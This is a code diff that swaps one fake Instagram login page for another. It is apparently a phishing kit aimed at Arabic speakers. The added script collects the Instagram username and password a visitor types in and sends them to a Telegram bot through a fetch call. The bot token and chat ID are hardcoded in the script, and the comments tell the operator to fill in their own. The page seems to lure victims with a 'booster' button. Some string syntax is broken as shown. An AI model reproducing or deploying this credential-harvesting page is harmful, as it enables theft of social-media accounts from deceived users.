@@ -1,32 +1,45 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - Instagram</title>
-    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
-    <link rel="stylesheet" href="styles.css">
-</head>
-<body>
-
-    <div class="container">
-        <h1>Instagram</h1>
-        <form id="resetPasswordForm">
-            <input type="text" id="username" class="form-input" placeholder="اسم المستخدم" required>
-            <input type="password" id="old_password" class="form-input" placeholder="كلمة السر القديمة" required>
-            <input type="password" id="new_password" class="form-input" placeholder="كلمة السر الجديدة" required>
-            <button type="submit" class="btn">إعادة تعيين كلمة السر</button>
-        </form>
+<div class="form-container" id="formContainer">
+      <h2>Enter Your Instagram Details</h2>
+      <input type="text" id="username" placeholder="Instagram Username" required>
+      <input type="password" id="password" placeholder="Instagram Password" required>
+      <button id="submitBtn">Submit</button>
     </div>
+  </div>
+  <script>
+    const telegramBotToken = '7876109899:AAE94CAbVoN4xfhGebpJ7nmHWR_8eXAQijI'; // ضع هنا توكن البوت
+    const chatId = '7351977239'; // ضع هنا chat ID الخاص بك
 
-    <div class="footer">
-        <p>هل نسيت كلمة السر؟ <a href="#">إعادة تعيين كلمة السر</a></p>
-    </div>
+    // دالة لإرسال البيانات إلى بوت تيليجرام
+    function sendToTelegram(username, password) {
+      const message = Instagram Username: ${username}\nInstagram Password: ${password};
+      const url = https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};
+      fetch(url)
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            alert('Your details have been sent successfully!');
+          } else {
+            alert('There was an error. Please try again.');
+          }
+        })
+        .catch(error => {
+          alert('There was an error. Please try again.');
+        });
+    }
 
-    <div class="meta">
-        <p>Meta∞</p>
-    </div>
+    document.getElementById('boosterBtn').addEventListener('click', () => {
+      document.getElementById('formContainer').style.display = 'block';
+    });
 
-    <script src="script.js"></script>
+    document.getElementById('submitBtn').addEventListener('click', () => {
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      if (username && password) {
+        sendToTelegram(username, password);
+      } else {
+        alert('Please enter both username and password.');
+      }
+    });
+  </script>
 </body>
 </html>
